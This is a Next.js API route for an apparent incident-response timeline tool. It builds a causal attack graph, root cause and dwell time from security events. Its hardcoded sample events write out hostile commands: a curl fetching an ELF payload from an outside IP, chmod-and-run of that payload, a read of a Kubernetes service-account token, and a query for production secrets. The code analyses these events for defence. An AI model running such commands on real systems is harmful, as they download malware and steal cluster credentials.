import { NextResponse } from 'next/server';
import {
  buildCausalTimeline,
  identifyRootCause,
  calculateDwellTime,
  renderAsciiTimeline
} from 'vigilante_lib/engine/timeline.js';

export const dynamic = 'force-dynamic';

export async function GET() {
  try {
    const defaultEvents = [
      {
        id: 'evt-1',
        timestamp: Date.now() - 120000,
        type: 'NETWORK_INGRESS',
        title: 'Inbound Ingress Connection on Port 8080',
        entity: 'ingress-nginx',
        srcIp: '198.51.100.42',
        dstPort: 8080,
        mitreTechnique: 'T1190',
        severity: 'MEDIUM',
        sourceModule: 'suricata',
        message: 'External connection to web frontend API'
      },
      {
        id: 'evt-2',
        timestamp: Date.now() - 115000,
        type: 'PROCESS_EXEC',
        title: 'Vulnerable SpringBoot WebShell Invocation',
        entity: 'web-frontend',
        pid: 1042,
        ppid: 1,
        command: '/bin/sh -c curl -O http://198.51.100.42/payload.elf',
        file: 'payload.elf',
        mitreTechnique: 'T1505.003',
        severity: 'CRITICAL',
        sourceModule: 'falco',
        message: 'Spawned shell command from JVM worker process'
      },
      {
        id: 'evt-3',
        timestamp: Date.now() - 95000,
        type: 'FILE_WRITE_THEN_EXEC',
        title: 'Payload Dropped & Chmod Execution',
        entity: 'web-frontend',
        pid: 1088,
        ppid: 1042,
        command: 'chmod +x /tmp/payload.elf && /tmp/payload.elf',
        file: '/tmp/payload.elf',
        mitreTechnique: 'T1059.004',
        severity: 'CRITICAL',
        sourceModule: 'falco',
        message: 'Executed downloaded binary in temporary folder'
      },
      {
        id: 'evt-4',
        timestamp: Date.now() - 60000,
        type: 'CREDENTIAL_DUMP',
        title: 'Kubernetes ServiceAccount Token Exfiltration',
        entity: 'web-frontend',
        pid: 1088,
        ppid: 1042,
        command: 'cat /var/run/secrets/kubernetes.io/serviceaccount/token',
        mitreTechnique: 'T1003',
        severity: 'HIGH',
        sourceModule: 'auditd',
        message: 'Read cluster JWT service account token'
      },
      {
        id: 'evt-5',
        timestamp: Date.now() - 20000,
        type: 'LATERAL_MOVEMENT',
        title: 'API Server Query to Secrets Vault',
        entity: 'kube-apiserver',
        pid: 1205,
        command: 'curl -k https://kubernetes.default/api/v1/namespaces/prod/secrets',
        mitreTechnique: 'T1021',
        severity: 'CRITICAL',
        sourceModule: 'wazuh',
        message: 'Unauthorized access to production namespace database credentials'
      }
    ];

    const dag = buildCausalTimeline(defaultEvents);
    const rootCause = identifyRootCause(dag);
    const dwell = calculateDwellTime(dag);
    const ascii = renderAsciiTimeline(dag);

    // Serialization helper for DAG since Map isn't directly JSON serializable
    return NextResponse.json({
      success: true,
      nodes: dag.nodes,
      edges: dag.edges,
      stats: dag.stats,
      rootCause,
      dwell,
      ascii
    });
  } catch (err: any) {
    return NextResponse.json(
      {
        success: false,
        error: err.message
      },
      { status: 500 }
    );
  }
}

export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { events = [] } = body;

    const dag = buildCausalTimeline(events);
    const rootCause = identifyRootCause(dag);
    const dwell = calculateDwellTime(dag);
    const ascii = renderAsciiTimeline(dag);

    return NextResponse.json({
      success: true,
      nodes: dag.nodes,
      edges: dag.edges,
      stats: dag.stats,
      rootCause,
      dwell,
      ascii
    });
  } catch (err: any) {
    return NextResponse.json({ success: false, error: err.message }, { status: 500 });
  }
}
